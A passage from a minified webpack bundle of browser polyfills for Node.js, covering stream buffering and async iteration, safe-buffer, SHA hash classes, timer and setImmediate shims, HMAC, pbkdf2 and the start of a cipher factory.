                        },
                    },
                    {
                        key: "shift",
                        value: function () {
                            if (0 !== this.length) {
                                var ret = this.head.data;
                                return 1 === this.length ? (this.head = this.tail = null) : (this.head = this.head.next), --this.length, ret;
                            }
                        },
                    },
                    {
                        key: "clear",
                        value: function () {
                            (this.head = this.tail = null), (this.length = 0);
                        },
                    },
                    {
                        key: "join",
                        value: function (s) {
                            if (0 === this.length) return "";
                            for (var p = this.head, ret = "" + p.data; (p = p.next); ) ret += s + p.data;
                            return ret;
                        },
                    },
                    {
                        key: "concat",
                        value: function (n) {
                            if (0 === this.length) return Buffer.alloc(0);
                            for (var src, target, offset, ret = Buffer.allocUnsafe(n >>> 0), p = this.head, i = 0; p; )
                                (src = p.data), (target = ret), (offset = i), Buffer.prototype.copy.call(src, target, offset), (i += p.data.length), (p = p.next);
                            return ret;
                        },
                    },
                    {
                        key: "consume",
                        value: function (n, hasStrings) {
                            var ret;
                            return (
                                n < this.head.data.length
                                    ? ((ret = this.head.data.slice(0, n)), (this.head.data = this.head.data.slice(n)))
                                    : (ret = n === this.head.data.length ? this.shift() : hasStrings ? this._getString(n) : this._getBuffer(n)),
                                ret
                            );
                        },
                    },
                    {
                        key: "first",
                        value: function () {
                            return this.head.data;
                        },
                    },
                    {
                        key: "_getString",
                        value: function (n) {
                            var p = this.head,
                                c = 1,
                                ret = p.data;
                            for (n -= ret.length; (p = p.next); ) {
                                var str = p.data,
                                    nb = n > str.length ? str.length : n;
                                if ((nb === str.length ? (ret += str) : (ret += str.slice(0, n)), 0 == (n -= nb))) {
                                    nb === str.length ? (++c, p.next ? (this.head = p.next) : (this.head = this.tail = null)) : ((this.head = p), (p.data = str.slice(nb)));
                                    break;
                                }
                                ++c;
                            }
                            return (this.length -= c), ret;
                        },
                    },
                    {
                        key: "_getBuffer",
                        value: function (n) {
                            var ret = Buffer.allocUnsafe(n),
                                p = this.head,
                                c = 1;
                            for (p.data.copy(ret), n -= p.data.length; (p = p.next); ) {
                                var buf = p.data,
                                    nb = n > buf.length ? buf.length : n;
                                if ((buf.copy(ret, ret.length - n, 0, nb), 0 == (n -= nb))) {
                                    nb === buf.length ? (++c, p.next ? (this.head = p.next) : (this.head = this.tail = null)) : ((this.head = p), (p.data = buf.slice(nb)));
                                    break;
                                }
                                ++c;
                            }
                            return (this.length -= c), ret;
                        },
                    },
                    {
                        key: custom,
                        value: function (_, options) {
                            return inspect(
                                this,
                                (function (target) {
                                    for (var i = 1; i < arguments.length; i++) {
                                        var source = null != arguments[i] ? arguments[i] : {};
                                        i % 2
                                            ? ownKeys(Object(source), !0).forEach(function (key) {
                                                  _defineProperty(target, key, source[key]);
                                              })
                                            : Object.getOwnPropertyDescriptors
                                            ? Object.defineProperties(target, Object.getOwnPropertyDescriptors(source))
                                            : ownKeys(Object(source)).forEach(function (key) {
                                                  Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
                                              });
                                    }
                                    return target;
                                })({}, options, { depth: 0, customInspect: !1 })
                            );
                        },
                    },
                ]) && _defineProperties(Constructor.prototype, protoProps),
                staticProps && _defineProperties(Constructor, staticProps),
                BufferList
            );
        })();
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        var buffer = __webpack_require__(6),
            Buffer = buffer.Buffer;
        function copyProps(src, dst) {
            for (var key in src) dst[key] = src[key];
        }
        function SafeBuffer(arg, encodingOrOffset, length) {
            return Buffer(arg, encodingOrOffset, length);
        }
        Buffer.from && Buffer.alloc && Buffer.allocUnsafe && Buffer.allocUnsafeSlow ? (module.exports = buffer) : (copyProps(buffer, exports), (exports.Buffer = SafeBuffer)),
            (SafeBuffer.prototype = Object.create(Buffer.prototype)),
            copyProps(Buffer, SafeBuffer),
            (SafeBuffer.from = function (arg, encodingOrOffset, length) {
                if ("number" == typeof arg) throw new TypeError("Argument must not be a number");
                return Buffer(arg, encodingOrOffset, length);
            }),
            (SafeBuffer.alloc = function (size, fill, encoding) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                var buf = Buffer(size);
                return void 0 !== fill ? ("string" == typeof encoding ? buf.fill(fill, encoding) : buf.fill(fill)) : buf.fill(0), buf;
            }),
            (SafeBuffer.allocUnsafe = function (size) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                return Buffer(size);
            }),
            (SafeBuffer.allocUnsafeSlow = function (size) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                return buffer.SlowBuffer(size);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (process) {
            var _Object$setPrototypeO;
            function _defineProperty(obj, key, value) {
                return key in obj ? Object.defineProperty(obj, key, { value: value, enumerable: !0, configurable: !0, writable: !0 }) : (obj[key] = value), obj;
            }
            var finished = __webpack_require__(46),
                kLastResolve = Symbol("lastResolve"),
                kLastReject = Symbol("lastReject"),
                kError = Symbol("error"),
                kEnded = Symbol("ended"),
                kLastPromise = Symbol("lastPromise"),
                kHandlePromise = Symbol("handlePromise"),
                kStream = Symbol("stream");
            function createIterResult(value, done) {
                return { value: value, done: done };
            }
            function readAndResolve(iter) {
                var resolve = iter[kLastResolve];
                if (null !== resolve) {
                    var data = iter[kStream].read();
                    null !== data && ((iter[kLastPromise] = null), (iter[kLastResolve] = null), (iter[kLastReject] = null), resolve(createIterResult(data, !1)));
                }
            }
            function onReadable(iter) {
                process.nextTick(readAndResolve, iter);
            }
            var AsyncIteratorPrototype = Object.getPrototypeOf(function () {}),
                ReadableStreamAsyncIteratorPrototype = Object.setPrototypeOf(
                    (_defineProperty(
                        (_Object$setPrototypeO = {
                            get stream() {
                                return this[kStream];
                            },
                            next: function () {
                                var _this = this,
                                    error = this[kError];
                                if (null !== error) return Promise.reject(error);
                                if (this[kEnded]) return Promise.resolve(createIterResult(void 0, !0));
                                if (this[kStream].destroyed)
                                    return new Promise(function (resolve, reject) {
                                        process.nextTick(function () {
                                            _this[kError] ? reject(_this[kError]) : resolve(createIterResult(void 0, !0));
                                        });
                                    });
                                var promise,
                                    lastPromise = this[kLastPromise];
                                if (lastPromise)
                                    promise = new Promise(
                                        (function (lastPromise, iter) {
                                            return function (resolve, reject) {
                                                lastPromise.then(function () {
                                                    iter[kEnded] ? resolve(createIterResult(void 0, !0)) : iter[kHandlePromise](resolve, reject);
                                                }, reject);
                                            };
                                        })(lastPromise, this)
                                    );
                                else {
                                    var data = this[kStream].read();
                                    if (null !== data) return Promise.resolve(createIterResult(data, !1));
                                    promise = new Promise(this[kHandlePromise]);
                                }
                                return (this[kLastPromise] = promise), promise;
                            },
                        }),
                        Symbol.asyncIterator,
                        function () {
                            return this;
                        }
                    ),
                    _defineProperty(_Object$setPrototypeO, "return", function () {
                        var _this2 = this;
                        return new Promise(function (resolve, reject) {
                            _this2[kStream].destroy(null, function (err) {
                                err ? reject(err) : resolve(createIterResult(void 0, !0));
                            });
                        });
                    }),
                    _Object$setPrototypeO),
                    AsyncIteratorPrototype
                );
            module.exports = function (stream) {
                var _Object$create,
                    iterator = Object.create(
                        ReadableStreamAsyncIteratorPrototype,
                        (_defineProperty((_Object$create = {}), kStream, { value: stream, writable: !0 }),
                        _defineProperty(_Object$create, kLastResolve, { value: null, writable: !0 }),
                        _defineProperty(_Object$create, kLastReject, { value: null, writable: !0 }),
                        _defineProperty(_Object$create, kError, { value: null, writable: !0 }),
                        _defineProperty(_Object$create, kEnded, { value: stream._readableState.endEmitted, writable: !0 }),
                        _defineProperty(_Object$create, kHandlePromise, {
                            value: function (resolve, reject) {
                                var data = iterator[kStream].read();
                                data
                                    ? ((iterator[kLastPromise] = null), (iterator[kLastResolve] = null), (iterator[kLastReject] = null), resolve(createIterResult(data, !1)))
                                    : ((iterator[kLastResolve] = resolve), (iterator[kLastReject] = reject));
                            },
                            writable: !0,
                        }),
                        _Object$create)
                    );
                return (
                    (iterator[kLastPromise] = null),
                    finished(stream, function (err) {
                        if (err && "ERR_STREAM_PREMATURE_CLOSE" !== err.code) {
                            var reject = iterator[kLastReject];
                            return null !== reject && ((iterator[kLastPromise] = null), (iterator[kLastResolve] = null), (iterator[kLastReject] = null), reject(err)), void (iterator[kError] = err);
                        }
                        var resolve = iterator[kLastResolve];
                        null !== resolve && ((iterator[kLastPromise] = null), (iterator[kLastResolve] = null), (iterator[kLastReject] = null), resolve(createIterResult(void 0, !0))), (iterator[kEnded] = !0);
                    }),
                    stream.on("readable", onReadable.bind(null, iterator)),
                    iterator
                );
            };
        }.call(this, __webpack_require__(7)));
    },
    function (module, exports) {
        module.exports = function () {
            throw new Error("Readable.from is not available in the browser");
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        module.exports = PassThrough;
        var Transform = __webpack_require__(88);
        function PassThrough(options) {
            if (!(this instanceof PassThrough)) return new PassThrough(options);
            Transform.call(this, options);
        }
        __webpack_require__(3)(PassThrough, Transform),
            (PassThrough.prototype._transform = function (chunk, encoding, cb) {
                cb(null, chunk);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var eos;
        var _require$codes = __webpack_require__(25).codes,
            ERR_MISSING_ARGS = _require$codes.ERR_MISSING_ARGS,
            ERR_STREAM_DESTROYED = _require$codes.ERR_STREAM_DESTROYED;
        function noop(err) {
            if (err) throw err;
        }
        function destroyer(stream, reading, writing, callback) {
            callback = (function (callback) {
                var called = !1;
                return function () {
                    called || ((called = !0), callback.apply(void 0, arguments));
                };
            })(callback);
            var closed = !1;
            stream.on("close", function () {
                closed = !0;
            }),
                void 0 === eos && (eos = __webpack_require__(46)),
                eos(stream, { readable: reading, writable: writing }, function (err) {
                    if (err) return callback(err);
                    (closed = !0), callback();
                });
            var destroyed = !1;
            return function (err) {
                if (!closed && !destroyed)
                    return (
                        (destroyed = !0),
                        (function (stream) {
                            return stream.setHeader && "function" == typeof stream.abort;
                        })(stream)
                            ? stream.abort()
                            : "function" == typeof stream.destroy
                            ? stream.destroy()
                            : void callback(err || new ERR_STREAM_DESTROYED("pipe"))
                    );
            };
        }
        function call(fn) {
            fn();
        }
        function pipe(from, to) {
            return from.pipe(to);
        }
        function popCallback(streams) {
            return streams.length ? ("function" != typeof streams[streams.length - 1] ? noop : streams.pop()) : noop;
        }
        module.exports = function () {
            for (var _len = arguments.length, streams = new Array(_len), _key = 0; _key < _len; _key++) streams[_key] = arguments[_key];
            var error,
                callback = popCallback(streams);
            if ((Array.isArray(streams[0]) && (streams = streams[0]), streams.length < 2)) throw new ERR_MISSING_ARGS("streams");
            var destroys = streams.map(function (stream, i) {
                var reading = i < streams.length - 1;
                return destroyer(stream, reading, i > 0, function (err) {
                    error || (error = err), err && destroys.forEach(call), reading || (destroys.forEach(call), callback(error));
                });
            });
            return streams.reduce(pipe);
        };
    },
    function (module, exports, __webpack_require__) {
        var inherits = __webpack_require__(3),
            Hash = __webpack_require__(27),
            Buffer = __webpack_require__(5).Buffer,
            K = [1518500249, 1859775393, -1894007588, -899497514],
            W = new Array(80);
        function Sha() {
            this.init(), (this._w = W), Hash.call(this, 64, 56);
        }
        function rotl30(num) {
            return (num << 30) | (num >>> 2);
        }
        function ft(s, b, c, d) {
            return 0 === s ? (b & c) | (~b & d) : 2 === s ? (b & c) | (b & d) | (c & d) : b ^ c ^ d;
        }
        inherits(Sha, Hash),
            (Sha.prototype.init = function () {
                return (this._a = 1732584193), (this._b = 4023233417), (this._c = 2562383102), (this._d = 271733878), (this._e = 3285377520), this;
            }),
            (Sha.prototype._update = function (M) {
                for (var num, W = this._w, a = 0 | this._a, b = 0 | this._b, c = 0 | this._c, d = 0 | this._d, e = 0 | this._e, i = 0; i < 16; ++i) W[i] = M.readInt32BE(4 * i);
                for (; i < 80; ++i) W[i] = W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16];
                for (var j = 0; j < 80; ++j) {
                    var s = ~~(j / 20),
                        t = 0 | ((((num = a) << 5) | (num >>> 27)) + ft(s, b, c, d) + e + W[j] + K[s]);
                    (e = d), (d = c), (c = rotl30(b)), (b = a), (a = t);
                }
                (this._a = (a + this._a) | 0), (this._b = (b + this._b) | 0), (this._c = (c + this._c) | 0), (this._d = (d + this._d) | 0), (this._e = (e + this._e) | 0);
            }),
            (Sha.prototype._hash = function () {
                var H = Buffer.allocUnsafe(20);
                return H.writeInt32BE(0 | this._a, 0), H.writeInt32BE(0 | this._b, 4), H.writeInt32BE(0 | this._c, 8), H.writeInt32BE(0 | this._d, 12), H.writeInt32BE(0 | this._e, 16), H;
            }),
            (module.exports = Sha);
    },
    function (module, exports, __webpack_require__) {
        var inherits = __webpack_require__(3),
            Hash = __webpack_require__(27),
            Buffer = __webpack_require__(5).Buffer,
            K = [1518500249, 1859775393, -1894007588, -899497514],
            W = new Array(80);
        function Sha1() {
            this.init(), (this._w = W), Hash.call(this, 64, 56);
        }
        function rotl5(num) {
            return (num << 5) | (num >>> 27);
        }
        function rotl30(num) {
            return (num << 30) | (num >>> 2);
        }
        function ft(s, b, c, d) {
            return 0 === s ? (b & c) | (~b & d) : 2 === s ? (b & c) | (b & d) | (c & d) : b ^ c ^ d;
        }
        inherits(Sha1, Hash),
            (Sha1.prototype.init = function () {
                return (this._a = 1732584193), (this._b = 4023233417), (this._c = 2562383102), (this._d = 271733878), (this._e = 3285377520), this;
            }),
            (Sha1.prototype._update = function (M) {
                for (var num, W = this._w, a = 0 | this._a, b = 0 | this._b, c = 0 | this._c, d = 0 | this._d, e = 0 | this._e, i = 0; i < 16; ++i) W[i] = M.readInt32BE(4 * i);
                for (; i < 80; ++i) W[i] = ((num = W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16]) << 1) | (num >>> 31);
                for (var j = 0; j < 80; ++j) {
                    var s = ~~(j / 20),
                        t = (rotl5(a) + ft(s, b, c, d) + e + W[j] + K[s]) | 0;
                    (e = d), (d = c), (c = rotl30(b)), (b = a), (a = t);
                }
                (this._a = (a + this._a) | 0), (this._b = (b + this._b) | 0), (this._c = (c + this._c) | 0), (this._d = (d + this._d) | 0), (this._e = (e + this._e) | 0);
            }),
            (Sha1.prototype._hash = function () {
                var H = Buffer.allocUnsafe(20);
                return H.writeInt32BE(0 | this._a, 0), H.writeInt32BE(0 | this._b, 4), H.writeInt32BE(0 | this._c, 8), H.writeInt32BE(0 | this._d, 12), H.writeInt32BE(0 | this._e, 16), H;
            }),
            (module.exports = Sha1);
    },
    function (module, exports, __webpack_require__) {
        var inherits = __webpack_require__(3),
            Sha256 = __webpack_require__(89),
            Hash = __webpack_require__(27),
            Buffer = __webpack_require__(5).Buffer,
            W = new Array(64);
        function Sha224() {
            this.init(), (this._w = W), Hash.call(this, 64, 56);
        }
        inherits(Sha224, Sha256),
            (Sha224.prototype.init = function () {
                return (this._a = 3238371032), (this._b = 914150663), (this._c = 812702999), (this._d = 4144912697), (this._e = 4290775857), (this._f = 1750603025), (this._g = 1694076839), (this._h = 3204075428), this;
            }),
            (Sha224.prototype._hash = function () {
                var H = Buffer.allocUnsafe(28);
                return H.writeInt32BE(this._a, 0), H.writeInt32BE(this._b, 4), H.writeInt32BE(this._c, 8), H.writeInt32BE(this._d, 12), H.writeInt32BE(this._e, 16), H.writeInt32BE(this._f, 20), H.writeInt32BE(this._g, 24), H;
            }),
            (module.exports = Sha224);
    },
    function (module, exports, __webpack_require__) {
        var inherits = __webpack_require__(3),
            SHA512 = __webpack_require__(90),
            Hash = __webpack_require__(27),
            Buffer = __webpack_require__(5).Buffer,
            W = new Array(160);
        function Sha384() {
            this.init(), (this._w = W), Hash.call(this, 128, 112);
        }
        inherits(Sha384, SHA512),
            (Sha384.prototype.init = function () {
                return (
                    (this._ah = 3418070365),
                    (this._bh = 1654270250),
                    (this._ch = 2438529370),
                    (this._dh = 355462360),
                    (this._eh = 1731405415),
                    (this._fh = 2394180231),
                    (this._gh = 3675008525),
                    (this._hh = 1203062813),
                    (this._al = 3238371032),
                    (this._bl = 914150663),
                    (this._cl = 812702999),
                    (this._dl = 4144912697),
                    (this._el = 4290775857),
                    (this._fl = 1750603025),
                    (this._gl = 1694076839),
                    (this._hl = 3204075428),
                    this
                );
            }),
            (Sha384.prototype._hash = function () {
                var H = Buffer.allocUnsafe(48);
                function writeInt64BE(h, l, offset) {
                    H.writeInt32BE(h, offset), H.writeInt32BE(l, offset + 4);
                }
                return (
                    writeInt64BE(this._ah, this._al, 0),
                    writeInt64BE(this._bh, this._bl, 8),
                    writeInt64BE(this._ch, this._cl, 16),
                    writeInt64BE(this._dh, this._dl, 24),
                    writeInt64BE(this._eh, this._el, 32),
                    writeInt64BE(this._fh, this._fl, 40),
                    H
                );
            }),
            (module.exports = Sha384);
    },
    function (module, exports, __webpack_require__) {
        module.exports = Stream;
        var EE = __webpack_require__(20).EventEmitter;
        function Stream() {
            EE.call(this);
        }
        __webpack_require__(3)(Stream, EE),
            (Stream.Readable = __webpack_require__(49)),
            (Stream.Writable = __webpack_require__(211)),
            (Stream.Duplex = __webpack_require__(212)),
            (Stream.Transform = __webpack_require__(213)),
            (Stream.PassThrough = __webpack_require__(214)),
            (Stream.Stream = Stream),
            (Stream.prototype.pipe = function (dest, options) {
                var source = this;
                function ondata(chunk) {
                    dest.writable && !1 === dest.write(chunk) && source.pause && source.pause();
                }
                function ondrain() {
                    source.readable && source.resume && source.resume();
                }
                source.on("data", ondata), dest.on("drain", ondrain), dest._isStdio || (options && !1 === options.end) || (source.on("end", onend), source.on("close", onclose));
                var didOnEnd = !1;
                function onend() {
                    didOnEnd || ((didOnEnd = !0), dest.end());
                }
                function onclose() {
                    didOnEnd || ((didOnEnd = !0), "function" == typeof dest.destroy && dest.destroy());
                }
                function onerror(er) {
                    if ((cleanup(), 0 === EE.listenerCount(this, "error"))) throw er;
                }
                function cleanup() {
                    source.removeListener("data", ondata),
                        dest.removeListener("drain", ondrain),
                        source.removeListener("end", onend),
                        source.removeListener("close", onclose),
                        source.removeListener("error", onerror),
                        dest.removeListener("error", onerror),
                        source.removeListener("end", cleanup),
                        source.removeListener("close", cleanup),
                        dest.removeListener("close", cleanup);
                }
                return source.on("error", onerror), dest.on("error", onerror), source.on("end", cleanup), source.on("close", cleanup), dest.on("close", cleanup), dest.emit("pipe", source), dest;
            });
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        "use strict";
        var Buffer = __webpack_require__(5).Buffer,
            util = __webpack_require__(207);
        (module.exports = (function () {
            function BufferList() {
                !(function (instance, Constructor) {
                    if (!(instance instanceof Constructor)) throw new TypeError("Cannot call a class as a function");
                })(this, BufferList),
                    (this.head = null),
                    (this.tail = null),
                    (this.length = 0);
            }
            return (
                (BufferList.prototype.push = function (v) {
                    var entry = { data: v, next: null };
                    this.length > 0 ? (this.tail.next = entry) : (this.head = entry), (this.tail = entry), ++this.length;
                }),
                (BufferList.prototype.unshift = function (v) {
                    var entry = { data: v, next: this.head };
                    0 === this.length && (this.tail = entry), (this.head = entry), ++this.length;
                }),
                (BufferList.prototype.shift = function () {
                    if (0 !== this.length) {
                        var ret = this.head.data;
                        return 1 === this.length ? (this.head = this.tail = null) : (this.head = this.head.next), --this.length, ret;
                    }
                }),
                (BufferList.prototype.clear = function () {
                    (this.head = this.tail = null), (this.length = 0);
                }),
                (BufferList.prototype.join = function (s) {
                    if (0 === this.length) return "";
                    for (var p = this.head, ret = "" + p.data; (p = p.next); ) ret += s + p.data;
                    return ret;
                }),
                (BufferList.prototype.concat = function (n) {
                    if (0 === this.length) return Buffer.alloc(0);
                    if (1 === this.length) return this.head.data;
                    for (var src, target, offset, ret = Buffer.allocUnsafe(n >>> 0), p = this.head, i = 0; p; ) (src = p.data), (target = ret), (offset = i), src.copy(target, offset), (i += p.data.length), (p = p.next);
                    return ret;
                }),
                BufferList
            );
        })()),
            util &&
                util.inspect &&
                util.inspect.custom &&
                (module.exports.prototype[util.inspect.custom] = function () {
                    var obj = util.inspect({ length: this.length });
                    return this.constructor.name + " " + obj;
                });
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        (function (global) {
            var scope = (void 0 !== global && global) || ("undefined" != typeof self && self) || window,
                apply = Function.prototype.apply;
            function Timeout(id, clearFn) {
                (this._id = id), (this._clearFn = clearFn);
            }
            (exports.setTimeout = function () {
                return new Timeout(apply.call(setTimeout, scope, arguments), clearTimeout);
            }),
                (exports.setInterval = function () {
                    return new Timeout(apply.call(setInterval, scope, arguments), clearInterval);
                }),
                (exports.clearTimeout = exports.clearInterval = function (timeout) {
                    timeout && timeout.close();
                }),
                (Timeout.prototype.unref = Timeout.prototype.ref = function () {}),
                (Timeout.prototype.close = function () {
                    this._clearFn.call(scope, this._id);
                }),
                (exports.enroll = function (item, msecs) {
                    clearTimeout(item._idleTimeoutId), (item._idleTimeout = msecs);
                }),
                (exports.unenroll = function (item) {
                    clearTimeout(item._idleTimeoutId), (item._idleTimeout = -1);
                }),
                (exports._unrefActive = exports.active = function (item) {
                    clearTimeout(item._idleTimeoutId);
                    var msecs = item._idleTimeout;
                    msecs >= 0 &&
                        (item._idleTimeoutId = setTimeout(function () {
                            item._onTimeout && item._onTimeout();
                        }, msecs));
                }),
                __webpack_require__(209),
                (exports.setImmediate = ("undefined" != typeof self && self.setImmediate) || (void 0 !== global && global.setImmediate) || (this && this.setImmediate)),
                (exports.clearImmediate = ("undefined" != typeof self && self.clearImmediate) || (void 0 !== global && global.clearImmediate) || (this && this.clearImmediate));
        }.call(this, __webpack_require__(8)));
    },
    function (module, exports, __webpack_require__) {
        (function (global, process) {
            !(function (global, undefined) {
                "use strict";
                if (!global.setImmediate) {
                    var registerImmediate,
                        html,
                        channel,
                        messagePrefix,
                        onGlobalMessage,
                        nextHandle = 1,
                        tasksByHandle = {},
                        currentlyRunningATask = !1,
                        doc = global.document,
                        attachTo = Object.getPrototypeOf && Object.getPrototypeOf(global);
                    (attachTo = attachTo && attachTo.setTimeout ? attachTo : global),
                        "[object process]" === {}.toString.call(global.process)
                            ? (registerImmediate = function (handle) {
                                  process.nextTick(function () {
                                      runIfPresent(handle);
                                  });
                              })
                            : !(function () {
                                  if (global.postMessage && !global.importScripts) {
                                      var postMessageIsAsynchronous = !0,
                                          oldOnMessage = global.onmessage;
                                      return (
                                          (global.onmessage = function () {
                                              postMessageIsAsynchronous = !1;
                                          }),
                                          global.postMessage("", "*"),
                                          (global.onmessage = oldOnMessage),
                                          postMessageIsAsynchronous
                                      );
                                  }
                              })()
                            ? global.MessageChannel
                                ? (((channel = new MessageChannel()).port1.onmessage = function (event) {
                                      runIfPresent(event.data);
                                  }),
                                  (registerImmediate = function (handle) {
                                      channel.port2.postMessage(handle);
                                  }))
                                : doc && "onreadystatechange" in doc.createElement("script")
                                ? ((html = doc.documentElement),
                                  (registerImmediate = function (handle) {
                                      var script = doc.createElement("script");
                                      (script.onreadystatechange = function () {
                                          runIfPresent(handle), (script.onreadystatechange = null), html.removeChild(script), (script = null);
                                      }),
                                          html.appendChild(script);
                                  }))
                                : (registerImmediate = function (handle) {
                                      setTimeout(runIfPresent, 0, handle);
                                  })
                            : ((messagePrefix = "setImmediate$" + Math.random() + "$"),
                              (onGlobalMessage = function (event) {
                                  event.source === global && "string" == typeof event.data && 0 === event.data.indexOf(messagePrefix) && runIfPresent(+event.data.slice(messagePrefix.length));
                              }),
                              global.addEventListener ? global.addEventListener("message", onGlobalMessage, !1) : global.attachEvent("onmessage", onGlobalMessage),
                              (registerImmediate = function (handle) {
                                  global.postMessage(messagePrefix + handle, "*");
                              })),
                        (attachTo.setImmediate = function (callback) {
                            "function" != typeof callback && (callback = new Function("" + callback));
                            for (var args = new Array(arguments.length - 1), i = 0; i < args.length; i++) args[i] = arguments[i + 1];
                            var task = { callback: callback, args: args };
                            return (tasksByHandle[nextHandle] = task), registerImmediate(nextHandle), nextHandle++;
                        }),
                        (attachTo.clearImmediate = clearImmediate);
                }
                function clearImmediate(handle) {
                    delete tasksByHandle[handle];
                }
                function runIfPresent(handle) {
                    if (currentlyRunningATask) setTimeout(runIfPresent, 0, handle);
                    else {
                        var task = tasksByHandle[handle];
                        if (task) {
                            currentlyRunningATask = !0;
                            try {
                                !(function (task) {
                                    var callback = task.callback,
                                        args = task.args;
                                    switch (args.length) {
                                        case 0:
                                            callback();
                                            break;
                                        case 1:
                                            callback(args[0]);
                                            break;
                                        case 2:
                                            callback(args[0], args[1]);
                                            break;
                                        case 3:
                                            callback(args[0], args[1], args[2]);
                                            break;
                                        default:
                                            callback.apply(void 0, args);
                                    }
                                })(task);
                            } finally {
                                clearImmediate(handle), (currentlyRunningATask = !1);
                            }
                        }
                    }
                }
            })("undefined" == typeof self ? (void 0 === global ? this : global) : self);
        }.call(this, __webpack_require__(8), __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        module.exports = PassThrough;
        var Transform = __webpack_require__(94),
            util = Object.create(__webpack_require__(34));
        function PassThrough(options) {
            if (!(this instanceof PassThrough)) return new PassThrough(options);
            Transform.call(this, options);
        }
        (util.inherits = __webpack_require__(3)),
            util.inherits(PassThrough, Transform),
            (PassThrough.prototype._transform = function (chunk, encoding, cb) {
                cb(null, chunk);
            });
    },
    function (module, exports, __webpack_require__) {
        module.exports = __webpack_require__(50);
    },
    function (module, exports, __webpack_require__) {
        module.exports = __webpack_require__(22);
    },
    function (module, exports, __webpack_require__) {
        module.exports = __webpack_require__(49).Transform;
    },
    function (module, exports, __webpack_require__) {
        module.exports = __webpack_require__(49).PassThrough;
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var inherits = __webpack_require__(3),
            Buffer = __webpack_require__(5).Buffer,
            Base = __webpack_require__(17),
            ZEROS = Buffer.alloc(128);
        function Hmac(alg, key) {
            Base.call(this, "digest"), "string" == typeof key && (key = Buffer.from(key)), (this._alg = alg), (this._key = key), key.length > 64 ? (key = alg(key)) : key.length < 64 && (key = Buffer.concat([key, ZEROS], 64));
            for (var ipad = (this._ipad = Buffer.allocUnsafe(64)), opad = (this._opad = Buffer.allocUnsafe(64)), i = 0; i < 64; i++) (ipad[i] = 54 ^ key[i]), (opad[i] = 92 ^ key[i]);
            this._hash = [ipad];
        }
        inherits(Hmac, Base),
            (Hmac.prototype._update = function (data) {
                this._hash.push(data);
            }),
            (Hmac.prototype._final = function () {
                var h = this._alg(Buffer.concat(this._hash));
                return this._alg(Buffer.concat([this._opad, h]));
            }),
            (module.exports = Hmac);
    },
    function (module, exports, __webpack_require__) {
        module.exports = __webpack_require__(97);
    },
    function (module, exports, __webpack_require__) {
        (function (global) {
            var ZERO_BUF,
                nextTick,
                Buffer = __webpack_require__(5).Buffer,
                checkParameters = __webpack_require__(99),
                defaultEncoding = __webpack_require__(100),
                sync = __webpack_require__(101),
                toBuffer = __webpack_require__(102),
                subtle = global.crypto && global.crypto.subtle,
                toBrowser = { sha: "SHA-1", "sha-1": "SHA-1", sha1: "SHA-1", sha256: "SHA-256", "sha-256": "SHA-256", sha384: "SHA-384", "sha-384": "SHA-384", "sha-512": "SHA-512", sha512: "SHA-512" },
                checks = [];
            function getNextTick() {
                return nextTick || (nextTick = global.process && global.process.nextTick ? global.process.nextTick : global.queueMicrotask ? global.queueMicrotask : global.setImmediate ? global.setImmediate : global.setTimeout);
            }
            function browserPbkdf2(password, salt, iterations, length, algo) {
                return subtle
                    .importKey("raw", password, { name: "PBKDF2" }, !1, ["deriveBits"])
                    .then(function (key) {
                        return subtle.deriveBits({ name: "PBKDF2", salt: salt, iterations: iterations, hash: { name: algo } }, key, length << 3);
                    })
                    .then(function (res) {
                        return Buffer.from(res);
                    });
            }
            module.exports = function (password, salt, iterations, keylen, digest, callback) {
                "function" == typeof digest && ((callback = digest), (digest = void 0));
                var algo = toBrowser[(digest = digest || "sha1").toLowerCase()];
                if (algo && "function" == typeof global.Promise) {
                    if ((checkParameters(iterations, keylen), (password = toBuffer(password, defaultEncoding, "Password")), (salt = toBuffer(salt, defaultEncoding, "Salt")), "function" != typeof callback))
                        throw new Error("No callback provided to pbkdf2");
                    !(function (promise, callback) {
                        promise.then(
                            function (out) {
                                getNextTick()(function () {
                                    callback(null, out);
                                });
                            },
                            function (e) {
                                getNextTick()(function () {
                                    callback(e);
                                });
                            }
                        );
                    })(
                        (function (algo) {
                            if (global.process && !global.process.browser) return Promise.resolve(!1);
                            if (!subtle || !subtle.importKey || !subtle.deriveBits) return Promise.resolve(!1);
                            if (void 0 !== checks[algo]) return checks[algo];
                            var prom = browserPbkdf2((ZERO_BUF = ZERO_BUF || Buffer.alloc(8)), ZERO_BUF, 10, 128, algo)
                                .then(function () {
                                    return !0;
                                })
                                .catch(function () {
                                    return !1;
                                });
                            return (checks[algo] = prom), prom;
                        })(algo).then(function (resp) {
                            return resp ? browserPbkdf2(password, salt, iterations, keylen, algo) : sync(password, salt, iterations, keylen, digest);
                        }),
                        callback
                    );
                } else
                    getNextTick()(function () {
                        var out;
                        try {
                            out = sync(password, salt, iterations, keylen, digest);
                        } catch (e) {
                            return callback(e);
                        }
                        callback(null, out);
                    });
            };
        }.call(this, __webpack_require__(8)));
    },
    function (module, exports, __webpack_require__) {
        var DES = __webpack_require__(219),
            aes = __webpack_require__(52),
            aesModes = __webpack_require__(53),
            desModes = __webpack_require__(232),
            ebtk = __webpack_require__(40);
        function createCipheriv(suite, key, iv) {
            if (((suite = suite.toLowerCase()), aesModes[suite])) return aes.createCipheriv(suite, key, iv);
            if (desModes[suite]) return new DES({ key: key, iv: iv, mode: suite });
            throw new TypeError("invalid suite type");
        }
        function createDecipheriv(suite, key, iv) {
            if (((suite = suite.toLowerCase()), aesModes[suite])) return aes.createDecipheriv(suite, key, iv);
            if (desModes[suite]) return new DES({ key: key, iv: iv, mode: suite, decrypt: !0 });
            throw new TypeError("invalid suite type");
        }
        (exports.createCipher = exports.Cipher = function (suite, password) {
            var keyLen, ivLen;
